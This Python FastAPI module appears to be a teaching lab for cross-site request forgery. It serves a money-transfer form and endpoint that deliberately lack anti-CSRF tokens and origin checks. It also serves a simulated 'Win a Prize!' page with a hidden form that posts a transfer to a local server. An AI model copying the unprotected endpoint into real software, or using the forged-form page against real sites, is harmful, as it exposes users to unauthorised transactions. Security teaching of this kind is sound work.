from typing import Optional

from fastapi import APIRouter, Cookie, Form, HTTPException
from fastapi.responses import HTMLResponse

router = APIRouter(prefix="/csrf", tags=["csrf attack"])

# Simulate user accounts
user_balances = {
    "user1": 1000,
    "user2": 500
}

@router.get("/", response_class=HTMLResponse)
def show_balance(user: Optional[str] = Cookie(None)):
    """
    This endpoint shows the user balance and contains a CSRF vulnerability.
    It doesn't validate the origin of the transfer request.
    """
    if not user or user not in user_balances:
        user = "user1"  # Default to user1 for demonstration
    
    balance = user_balances[user]
    
    # Vulnerable form that doesn't have CSRF protection
    html_content = f"""
    <html>
        <head>
            <title>Your Account</title>
        </head>
        <body>
            <h1>Welcome, {user}!</h1>
            <p>Your current balance: ${balance}</p>
            
            <h2>Transfer Money</h2>
            <form action="/csrf/transfer" method="POST">
                <label for="recipient">Recipient:</label>
                <input type="text" id="recipient" name="recipient" required><br><br>
                
                <label for="amount">Amount:</label>
                <input type="number" id="amount" name="amount" required><br><br>
                
                <input type="submit" value="Transfer">
            </form>
        </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@router.post("/transfer")
async def transfer_money(recipient: str = Form(...), amount: int = Form(...), user: Optional[str] = Cookie(None)):
    """
    This endpoint is vulnerable to CSRF attacks because it doesn't validate
    the origin of the request or use anti-CSRF tokens.
    """
    if not user or user not in user_balances:
        user = "user1"  # Default to user1 for demonstration
    
    if amount <= 0:
        raise HTTPException(status_code=400, detail="Amount must be positive")
    
    if recipient not in user_balances:
        raise HTTPException(status_code=400, detail="Recipient not found")
    
    if user_balances[user] < amount:
        raise HTTPException(status_code=400, detail="Insufficient funds")
    
    # Perform the transfer
    user_balances[user] -= amount
    user_balances[recipient] += amount
    
    return {"message": f"Successfully transferred ${amount} to {recipient}", 
            "new_balance": user_balances[user]}

@router.get("/attack", response_class=HTMLResponse)
def csrf_attack_page():
    """
    This page simulates a malicious website that contains a CSRF attack.
    """
    malicious_html = """
    <html>
        <head>
            <title>Win a Prize!</title>
        </head>
        <body>
            <h1>You've won a prize!</h1>
            <p>Click the button below to claim your reward.</p>
            
            <!-- Hidden form that will automatically submit and transfer money -->
            <form id="malicious-form" action="http://localhost:8000/csrf/transfer" method="POST" style="display:none;">
                <input type="text" name="recipient" value="user2">
                <input type="number" name="amount" value="100">
            </form>
            
            <button onclick="document.getElementById('malicious-form').submit();">Claim Your Prize!</button>
            
            <script>
                // Automatically submit the form when the page loads
                // window.onload = function() {
                //     document.getElementById('malicious-form').submit();
                // }
            </script>
        </body>
    </html>
    """
    return HTMLResponse(content=malicious_html)
